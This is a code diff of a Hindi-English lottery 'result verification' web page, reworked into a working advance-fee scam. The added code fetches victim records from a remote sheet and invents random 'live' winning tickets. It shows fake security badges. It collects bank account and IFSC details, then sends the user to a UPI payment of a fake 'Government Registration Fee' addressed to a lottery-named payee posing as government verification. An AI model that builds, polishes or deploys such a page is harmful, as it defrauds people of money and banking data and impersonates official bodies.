@@ -3,166 +3,282 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Customer Result Verification Portal</title>
+  <title>Official Customer Result Verification Portal</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
-    body { background: #070d24; color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px 12px; }
-    .support-bar { width: 100%; max-width: 440px; background: #121c3b; border: 1px solid #ffcc00; border-radius: 10px; padding: 10px 14px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
-    .support-label { font-size: 11px; color: #ffcc00; font-weight: bold; }
-    .support-num { font-size: 15px; font-weight: bold; color: #fff; text-decoration: none; }
-    .call-btn { background: #22c55e; color: #fff; padding: 6px 12px; border-radius: 6px; font-size: 12px; font-weight: bold; text-decoration: none; }
-    .header { text-align: center; margin-bottom: 15px; }
-    .header h1 { font-size: 18px; color: #ffcc00; margin-top: 5px; }
-    .header p { color: #8c9fc2; font-size: 12px; }
-    .card { width: 100%; max-width: 440px; background: #101a38; border: 1px solid rgba(255, 204, 0, 0.3); border-radius: 12px; padding: 18px; margin-bottom: 18px; }
-    label { display: block; color: #ccd9f0; font-size: 12px; margin-bottom: 5px; font-weight: bold; }
-    input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #2e4374; background: #070d22; color: #fff; font-size: 14px; margin-bottom: 12px; outline: none; }
-    .check-btn { width: 100%; background: #ffcc00; color: #000; font-weight: bold; border: none; padding: 12px; border-radius: 8px; font-size: 15px; cursor: pointer; }
-    #statusMsg { text-align: center; margin-top: 10px; font-size: 13px; font-weight: bold; display: none; }
-    #resultBox { display: none; margin-top: 15px; border-top: 1px dashed rgba(255, 255, 255, 0.2); padding-top: 15px; text-align: center; }
-    .winner-status { background: rgba(34, 197, 94, 0.15); border: 1px solid #22c55e; border-radius: 8px; padding: 12px; }
-    .withdraw-btn { display: inline-block; margin-top: 10px; background: #22c55e; color: #fff; padding: 10px 18px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 14px; border: none; cursor: pointer; }
-    .winners-table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }
-    .winners-table th, .winners-table td { padding: 8px 4px; text-align: center; border-bottom: 1px solid rgba(255, 255, 255, 0.08); }
-    .winners-table th { color: #ffcc00; font-weight: bold; }
-    .badge { color: #ffcc00; font-weight: bold; }
-    .prize-tag { color: #22c55e; font-weight: bold; }
-    .person-tag { color: #8c9fc2; font-size: 11px; }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
+    body { background: radial-gradient(circle at top, #132247 0%, #060b1c 100%); color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px 12px; }
+    .support-bar { width: 100%; max-width: 440px; background: linear-gradient(135deg, #1b284e, #0e1733); border: 1px solid #ffcc00; border-radius: 12px; padding: 10px 14px; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
+    .support-info { display: flex; flex-direction: column; }
+    .support-label { font-size: 11px; color: #ffcc00; font-weight: 700; letter-spacing: 0.5px; }
+    .support-num { font-size: 15px; font-weight: 800; color: #ffffff; text-decoration: none; }
+    .call-btn { background: #22c55e; color: #fff; padding: 7px 14px; border-radius: 8px; font-size: 12px; font-weight: 700; text-decoration: none; display: inline-flex; align-items: center; gap: 5px; }
+    .header { text-align: center; margin-bottom: 20px; }
+    .badge { display: inline-block; background: rgba(255, 204, 0, 0.15); border: 1px solid #ffcc00; color: #ffcc00; padding: 4px 14px; border-radius: 20px; font-size: 11px; font-weight: 600; letter-spacing: 0.5px; margin-bottom: 6px; }
+    .header h1 { font-size: 20px; font-weight: 700; color: #fff; }
+    .header p { color: #8c9fc2; font-size: 12.5px; margin-top: 4px; }
+    .card { width: 100%; max-width: 440px; background: rgba(18, 29, 61, 0.85); backdrop-filter: blur(10px); border: 1px solid rgba(255, 204, 0, 0.35); border-radius: 16px; padding: 22px 18px; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5); }
+    .form-group { margin-bottom: 14px; }
+    label { display: block; color: #ccd9f0; font-size: 13px; margin-bottom: 6px; font-weight: 600; }
+    input { width: 100%; padding: 13px; border-radius: 10px; border: 1px solid #2e4374; background: #080f24; color: #fff; font-size: 14px; outline: none; transition: 0.3s; }
+    input:focus { border-color: #ffcc00; box-shadow: 0 0 10px rgba(255, 204, 0, 0.3); }
+    .check-btn { width: 100%; background: linear-gradient(135deg, #ffcc00, #ff9900); color: #000; font-weight: 700; border: none; padding: 14px; border-radius: 10px; font-size: 16px; cursor: pointer; box-shadow: 0 6px 15px rgba(255, 204, 0, 0.3); transition: transform 0.2s; }
+    .check-btn:active { transform: scale(0.98); }
+    #statusMsg { text-align: center; margin-top: 15px; font-size: 14px; font-weight: 600; }
+    #resultBox { display: none; margin-top: 20px; border-top: 1px dashed rgba(255, 255, 255, 0.15); padding-top: 20px; animation: fadeIn 0.4s ease; }
+    .winner-status { text-align: center; background: rgba(40, 167, 69, 0.15); border: 1px solid #28a745; color: #4ade80; padding: 6px; border-radius: 8px; font-size: 13px; font-weight: 700; margin-bottom: 15px; }
+    .prize-highlight { text-align: center; background: linear-gradient(135deg, #182852, #101c3d); border: 1px solid rgba(255, 204, 0, 0.4); border-radius: 12px; padding: 14px; margin-bottom: 15px; }
+    .prize-title { color: #ffcc00; font-size: 12.5px; text-transform: uppercase; letter-spacing: 1px; }
+    .prize-amount { font-size: 25px; font-weight: 800; color: #fff; margin-top: 4px; }
+    .info-list { background: #0a132c; border-radius: 10px; padding: 12px 14px; margin-bottom: 15px; }
+    .info-row { display: flex; justify-content: space-between; padding: 7px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.05); font-size: 13px; }
+    .info-row:last-child { border-bottom: none; }
+    .info-row span { color: #8c9fc2; }
+    .info-row strong { color: #e5edff; }
+    .withdraw-box { background: #0a142e; border: 1px solid #273863; border-radius: 12px; padding: 15px; margin-top: 15px; }
+    .withdraw-box h3 { font-size: 13.5px; color: #ffcc00; margin-bottom: 12px; display: flex; align-items: center; gap: 6px; }
+    .bank-input { margin-bottom: 10px; }
+    .bank-input label { font-size: 11.5px; color: #94a3b8; margin-bottom: 4px; }
+    .bank-input input { padding: 10px 12px; font-size: 13px; }
+    .fee-notice { background: rgba(255, 204, 0, 0.1); border: 1px solid rgba(255, 204, 0, 0.3); border-radius: 8px; padding: 10px 12px; margin: 12px 0; display: flex; justify-content: space-between; align-items: center; font-size: 13px; }
+    .fee-notice span { color: #e2e8f0; font-weight: 600; }
+    .fee-notice strong { color: #ffcc00; font-size: 15px; }
+    .pay-btn { display: block; width: 100%; background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; text-decoration: none; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; text-align: center; box-shadow: 0 6px 15px rgba(34, 197, 94, 0.3); }
+    .winner-board { margin-top: 25px; background: #09122a; border: 1px solid #1f305c; border-radius: 12px; padding: 15px; }
+    .winner-board-title { font-size: 12.5px; font-weight: 700; color: #ffcc00; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; border-bottom: 1px solid #1c2b52; padding-bottom: 8px; }
+    .live-dot { display: inline-block; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; margin-right: 5px; }
+    .winner-item { display: flex; align-items: center; justify-content: space-between; padding: 8px 0; font-size: 12px; border-bottom: 1px dashed rgba(255,255,255,0.06); }
+    .winner-item:last-child { border-bottom: none; }
+    .rank-tag { width: 22px; height: 22px; background: #182852; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; color: #ffcc00; margin-right: 8px; }
+    .ticket-code { font-family: monospace; color: #e2e8f0; font-weight: 600; }
+    .prize-level-badge { font-size: 10px; background: #1c2e59; color: #93c5fd; padding: 2px 6px; border-radius: 4px; margin-left: 5px; }
+    .prize-side { text-align: right; }
+    .prize-tag { color: #4ade80; font-weight: 700; display: block; }
+    .winners-count { color: #718096; font-size: 10px; }
+    .trust-footer { display: flex; justify-content: center; gap: 15px; margin-top: 25px; font-size: 11px; color: #64748b; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
   </style>
 </head>
 <body>
 
+  <!-- Support Bar -->
   <div class="support-bar">
-    <div>
-      <div class="support-label">CUSTOMER SUPPORT</div>
-      <a href="tel:9876543210" class="support-num">+91 98765 43210</a>
+    <div class="support-info">
+      <span class="support-label">📞 24x7 CUSTOMER HELPLINE</span>
+      <a href="tel:8709171965" class="support-num">+91 8709171965</a>
     </div>
-    <a href="tel:9876543210" class="call-btn">Call Now</a>
+    <a href="tel:8709171965" class="call-btn">Call Support</a>
   </div>
 
   <div class="header">
-    <h1>Result Verification Portal</h1>
-    <p>Apna number ya ticket check karke prize claim karein</p>
+    <div class="badge">SECURE VERIFICATION</div>
+    <h1>Official Customer Result Verification Portal</h1>
+    <p>Apna Ticket Number ya Mobile Number darj karein</p>
   </div>
 
   <div class="card">
-    <label for="userQuery">ENTER MOBILE NO / TICKET NO</label>
-    <input type="text" id="userQuery" placeholder="Jaise: 9876543210 ya TKT-101">
-    <button class="check-btn" onclick="checkUserResult()">CHECK RESULT</button>
+    <div class="form-group">
+      <label>Ticket Number / Mobile Number</label>
+      <input type="text" id="searchInput" placeholder="e.g. KL-584920 ya 9876543210">
+    </div>
+
+    <button class="check-btn" type="button" onclick="verifyTicket()">Check Status</button>
+
     <div id="statusMsg"></div>
 
+    <!-- Search Result Box -->
     <div id="resultBox">
-      <div class="winner-status">
-        <h3 style="color: #22c55e; margin-bottom: 6px;">🎉 Congratulations!</h3>
-        <p style="font-size: 13px;">Ticket No: <strong id="resTicket" style="color: #ffcc00;"></strong></p>
-        <p style="font-size: 14px; margin-top: 4px;">Winning Amount: <strong id="resPrize" style="color: #22c55e; font-size: 16px;"></strong></p>
-        <button class="withdraw-btn" onclick="initiateWithdraw()">Withdraw Winning Prize</button>
+      <div class="winner-status">🎉 CONGRATULATIONS! WINNER VERIFIED</div>
+
+      <div class="prize-highlight">
+        <div class="prize-title" id="resPrize">1st Prize</div>
+        <div class="prize-amount" id="resAmount">₹0</div>
       </div>
+
+      <div class="info-list">
+        <div class="info-row"><span>Winner Name</span><strong id="resName">-</strong></div>
+        <div class="info-row"><span>Ticket Number</span><strong id="resTicket">-</strong></div>
+        <div class="info-row"><span>Registered Mobile</span><strong id="resMobile">-</strong></div>
+      </div>
+
+      <!-- Withdraw Section -->
+      <div class="withdraw-box">
+        <h3>🏦 Withdraw Prize to Bank Account</h3>
+        
+        <div class="bank-input">
+          <label>Account Holder Name</label>
+          <input type="text" id="accHolderName" placeholder="As per bank passbook">
+        </div>
+
+        <div class="bank-input">
+          <label>Bank Name</label>
+          <input type="text" id="bankName" placeholder="e.g. State Bank of India">
+        </div>
+
+        <div class="bank-input">
+          <label>Account Number</label>
+          <input type="number" id="accNumber" placeholder="Enter bank account number">
+        </div>
+
+        <div class="bank-input">
+          <label>IFSC Code</label>
+          <input type="text" id="ifscCode" placeholder="e.g. SBIN0001234" style="text-transform: uppercase;">
+        </div>
+
+        <div class="fee-notice">
+          <span>Government Registration Fees:</span>
+          <strong id="resFee">₹0</strong>
+        </div>
+
+        <a id="payLink" class="pay-btn" href="javascript:void(0)" onclick="handleWithdrawPayment()">Pay Registration Fee & Claim</a>
+      </div>
+    </div>
+
+    <!-- 1 to 10 Winners Board -->
+    <div class="winner-board">
+      <div class="winner-board-title">
+        <span>🏆 TODAY'S TOP 10 WINNING TICKETS</span>
+        <span><span class="live-dot"></span>LIVE</span>
+      </div>
+      <div id="winnerListContainer"></div>
     </div>
   </div>
 
-  <div class="card">
-    <h2 style="font-size: 15px; color: #ffcc00; text-align: center; margin-bottom: 8px;">🏆 Winning Prize Structure (Rank 1 to 10)</h2>
-    <table class="winners-table">
-      <thead>
-        <tr>
-          <th>Rank</th>
-          <th>Ticket No</th>
-          <th>Winning Prize</th>
-          <th>Winners</th>
-        </tr>
-      </thead>
-      <tbody id="topWinnersList"></tbody>
-    </table>
+  <div class="trust-footer">
+    <span>🔒 256-Bit SSL Secured</span>
+    <span>⚡ Instant Validation</span>
+    <span>🛡️ Direct Verification</span>
   </div>
 
   <script>
-    const topTenWinners = [
-      { rank: "1st", ticket: "TKT-8842", prize: "₹25,00,00,000", persons: "1 Person" },
-      { rank: "2nd", ticket: "TKT-6512", prize: "₹10,00,00,000", persons: "1 Person" },
-      { rank: "3rd", ticket: "TKT-3129", prize: "₹75,00,000", persons: "1 Person" },
-      { rank: "4th", ticket: "TKT-9910", prize: "₹25,00,000", persons: "12 Persons" },
-      { rank: "5th", ticket: "TKT-4418", prize: "₹12,00,000", persons: "16 Persons" },
-      { rank: "6th", ticket: "TKT-1209", prize: "₹1,00,000", persons: "36 Persons" },
-      { rank: "7th", ticket: "TKT-7734", prize: "₹75,000", persons: "99 Persons" },
-      { rank: "8th", ticket: "TKT-5521", prize: "₹25,000", persons: "120 Persons" },
-      { rank: "9th", ticket: "TKT-2981", prize: "₹10,000", persons: "179 Persons" },
-      { rank: "10th", ticket: "TKT-6019", prize: "₹2,500", persons: "200 Persons" }
+    const API_URL = "https://sheetdb.io/api/v1/vpi9mg3o0yk7q";
+    let currentFee = "3250";
+    let currentUpi = "keralaLottery@paytm";
+
+    const prizeData = [
+      { rank: "1st Prize", prize: "₹25,00,00,000", count: "1 Winner" },
+      { rank: "2nd Prize", prize: "₹10,00,00,000", count: "1 Winner" },
+      { rank: "3rd Prize", prize: "₹75,00,000", count: "1 Winner" },
+      { rank: "4th Prize", prize: "₹25,00,000", count: "12 Winners" },
+      { rank: "5th Prize", prize: "₹12,00,000", count: "16 Winners" },
+      { rank: "6th Prize", prize: "₹1,00,000", count: "36 Winners" },
+      { rank: "7th Prize", prize: "₹75,000", count: "99 Winners" },
+      { rank: "8th Prize", prize: "₹25,000", count: "120 Winners" },
+      { rank: "9th Prize", prize: "₹10,000", count: "179 Winners" },
+      { rank: "10th Prize", prize: "₹2,500", count: "200 Winners" }
     ];
 
-    function loadTopWinners() {
-      const tbody = document.getElementById("topWinnersList");
-      tbody.innerHTML = topTenWinners.map(w => `
-        <tr>
-          <td class="badge">${w.rank}</td>
-          <td>${w.ticket}</td>
-          <td class="prize-tag">${w.prize}</td>
-          <td class="person-tag">${w.persons}</td>
-        </tr>
-      `).join("");
-    }
+    async function loadWinnerBoard() {
+      const container = document.getElementById("winnerListContainer");
+      const series = ["KL", "WB", "SK", "DL", "PB", "MH", "RJ", "KA", "GJ", "TN"];
+      let savedRecords = [];
 
-    function getAllWinnersData() {
-      let list = [
-        { id: "9876543210", ticket: "TKT-101", prize: "₹25,00,000" },
-        { id: "9123456780", ticket: "TKT-102", prize: "₹1,00,000" },
-        { id: "9988776655", ticket: "TKT-103", prize: "₹25,000" }
-      ];
       try {
-        const storageKeys = ["winners", "allWinners", "lotteryWinners", "users", "winnerList"];
-        for (let k of storageKeys) {
-          const item = localStorage.getItem(k);
-          if (item) {
-            const parsed = JSON.parse(item);
-            if (Array.isArray(parsed) && parsed.length > 0) {
-              list = parsed.concat(list);
-              break;
-            }
-          }
-        }
+        const res = await fetch(API_URL);
+        savedRecords = await res.json();
       } catch (e) {
-        console.log("Storage check error:", e);
+        savedRecords = [];
       }
-      return list;
+
+      let html = "";
+      for (let i = 0; i < 10; i++) {
+        let ticketNum = "";
+        let levelName = prizeData[i].rank;
+
+        const match = savedRecords.find(item => item.prize && item.prize.toLowerCase().includes((i + 1).toString()));
+        if (match && match.ticket) {
+          ticketNum = match.ticket;
+        } else if (savedRecords[i] && savedRecords[i].ticket) {
+          ticketNum = savedRecords[i].ticket;
+        } else {
+          const randSeries = series[i];
+          const randDigits = Math.floor(100000 + Math.random() * 900000);
+          ticketNum = `${randSeries} ${randDigits}`;
+        }
+
+        html += `
+          <div class="winner-item">
+            <div>
+              <span class="rank-tag">${i + 1}</span>
+              <span class="ticket-code">${ticketNum}</span>
+              <span class="prize-level-badge">${levelName}</span>
+            </div>
+            <div class="prize-side">
+              <span class="prize-tag">${prizeData[i].prize}</span>
+              <span class="winners-count">${prizeData[i].count}</span>
+            </div>
+          </div>
+        `;
+      }
+      container.innerHTML = html;
     }
 
-    function checkUserResult() {
-      const val = document.getElementById("userQuery").value.trim().toLowerCase();
-      const statusMsg = document.getElementById("statusMsg");
-      const resultBox = document.getElementById("resultBox");
-      statusMsg.style.display = "none";
-      resultBox.style.display = "none";
+    loadWinnerBoard();
 
-      if (!val) {
-        statusMsg.style.color = "#ef4444";
-        statusMsg.textContent = "Kripya apna mobile number ya ticket number daalein.";
-        statusMsg.style.display = "block";
+    async function verifyTicket() {
+      const query = document.getElementById("searchInput").value.trim().toLowerCase();
+      const status = document.getElementById("statusMsg");
+      const box = document.getElementById("resultBox");
+
+      if (!query) {
+        status.style.color = "#f87171";
+        status.textContent = "Kripya valid Ticket ya Mobile Number dalein.";
+        box.style.display = "none";
         return;
       }
 
-      const allWinners = getAllWinnersData();
-      const matched = allWinners.find(item => {
-        const phone = (item.mobile || item.phone || item.id || "").toString().toLowerCase();
-        const ticket = (item.ticket || item.ticketNo || item.ticket_number || "").toString().toLowerCase();
-        return phone === val || ticket === val;
-      });
+      status.style.color = "#ffcc00";
+      status.textContent = "Searching records in server...";
+      box.style.display = "none";
 
-      if (matched) {
-        document.getElementById("resTicket").textContent = matched.ticket || matched.ticketNo || matched.ticket_number || "Verified";
-        document.getElementById("resPrize").textContent = matched.prize || matched.amount || matched.winning_prize || "₹25,000";
-        resultBox.style.display = "block";
-      } else {
-        statusMsg.style.color = "#ef4444";
-        statusMsg.textContent = "Aapka ticket/number list me nahi mila.";
-        statusMsg.style.display = "block";
+      try {
+        const response = await fetch(API_URL);
+        const data = await response.json();
+
+        const item = data.find(r => 
+          (r.ticket && r.ticket.trim().toLowerCase() === query) ||
+          (r.mobile && r.mobile.trim() === query)
+        );
+
+        if (item) {
+          status.textContent = "";
+          document.getElementById("resPrize").textContent = item.prize || "Prize Winner";
+          document.getElementById("resAmount").textContent = item.amount || "₹0";
+          document.getElementById("resName").textContent = item.name || "-";
+          document.getElementById("resTicket").textContent = item.ticket || "-";
+          document.getElementById("resMobile").textContent = item.mobile ? item.mobile.replace(/.(?=.{4})/g, '*') : "-";
+          
+          currentFee = item.fee || "3250";
+          currentUpi = item.upiId || "keralaLottery@paytm";
+
+          document.getElementById("resFee").textContent = "₹" + currentFee;
+          document.getElementById("accHolderName").value = item.name || "";
+
+          box.style.display = "block";
+        } else {
+          status.style.color = "#f87171";
+          status.textContent = "Koi record nahi mila. Ticket/Mobile no dobara check karein.";
+        }
+      } catch (err) {
+        status.style.color = "#f87171";
+        status.textContent = "Server se connect nahi ho paya. Dobara koshish karein.";
       }
     }
 
-    function initiateWithdraw() {
-      alert("Withdrawal request lag gayi hai! Hamari team aapse sampark karegi.");
-    }
+    function handleWithdrawPayment() {
+      const name = document.getElementById("accHolderName").value.trim();
+      const bank = document.getElementById("bankName").value.trim();
+      const acc = document.getElementById("accNumber").value.trim();
+      const ifsc = document.getElementById("ifscCode").value.trim();
 
-    loadTopWinners();
+      if (!name || !bank || !acc || !ifsc) {
+        alert("Kripya bank details poori bharein (Name, Bank Name, Account No, IFSC).");
+        return;
+      }
+
+      const upiUrl = `upi://pay?pa=${encodeURIComponent(currentUpi)}&pn=GovVerification&am=${currentFee}&cu=INR&tn=RegistrationFee`;
+      window.location.href = upiUrl;
+    }
   </script>
 </body>
 </html>
